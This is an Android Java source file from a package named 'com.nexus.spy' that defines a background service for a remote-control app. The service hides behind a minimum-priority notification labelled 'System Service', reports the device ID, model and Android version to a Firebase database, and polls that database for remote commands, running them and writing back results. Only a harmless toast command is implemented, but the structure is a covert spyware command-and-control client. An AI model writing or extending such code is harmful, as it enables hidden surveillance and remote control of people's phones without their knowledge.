package com.nexus.spy;
import android.app.*;
import android.content.Intent;
import android.os.*;
import android.provider.Settings;
import com.google.firebase.database.*;
import java.util.*;
public class HeartbeatService extends Service {
    String deviceId;
    @Override public int onStartCommand(Intent i, int f, int s) {
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        NotificationChannel ch = new NotificationChannel("sys_svc","System Service", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(1, new Notification.Builder(this,"sys_svc").setSmallIcon(android.R.drawable.stat_notify_sync).setPriority(Notification.PRIORITY_MIN).build());

        Map<String, Object> dev = new HashMap<>();
        dev.put("model", android.os.Build.MODEL); dev.put("android", android.os.Build.VERSION.RELEASE);
        dev.put("lastSeen", System.currentTimeMillis()); dev.put("active", true);
        FirebaseHelper.getDevicesRef().child(deviceId).updateChildren(dev);

        FirebaseHelper.getCommandsRef(deviceId).addChildEventListener(new ChildEventListener() {
            @Override public void onChildAdded(DataSnapshot snap, String prev) {
                String type = snap.child("type").getValue(String.class);
                String status = snap.child("status").getValue(String.class);
                if ("pending".equals(status)) {
                    String result = executeCommand(type, snap);
                    snap.getRef().child("status").setValue("done");
                    snap.getRef().child("result").setValue(result);
                }
            }
            @Override public void onChildChanged(DataSnapshot s, String p) {}
            @Override public void onChildRemoved(DataSnapshot s) {}
            @Override public void onChildMoved(DataSnapshot s, String p) {}
            @Override public void onCancelled(DatabaseError e) {}
        });
        return START_STICKY;
    }
    String executeCommand(String type, DataSnapshot snap) {
        try {
            if ("TOAST".equals(type)) {
                String msg = snap.child("args/message").getValue(String.class);
                new Handler(Looper.getMainLooper()).post(() -> android.widget.Toast.makeText(getApplicationContext(), msg, android.widget.Toast.LENGTH_LONG).show());
                return "toast ok";
            }
            return "executed " + type;
        } catch (Exception e) { return "error"; }
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
